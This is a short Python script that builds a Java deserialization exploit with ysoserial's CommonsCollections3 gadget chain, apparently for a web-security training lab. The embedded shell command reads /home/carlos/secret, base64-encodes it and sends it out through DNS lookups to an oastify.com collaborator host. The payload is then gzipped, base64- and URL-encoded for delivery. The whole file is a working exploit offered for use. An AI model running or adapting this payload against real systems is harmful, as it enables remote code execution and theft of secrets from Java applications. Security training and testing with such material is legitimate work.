import subprocess, gzip, base64
from urllib.parse import quote

payload = subprocess.check_output([
    "java", "-jar", "ysoserial.jar", "CommonsCollections3", 'bash -c "cat /home/carlos/secret | base64 | xargs -I{} nslookup {}.5ci9ruoii3xzz58q64zmabsem5swgo4d.oastify.com"'
])

gzipped = gzip.compress(payload)
b64 = base64.b64encode(gzipped).decode()
url_encoded = quote(b64)

print(url_encoded)
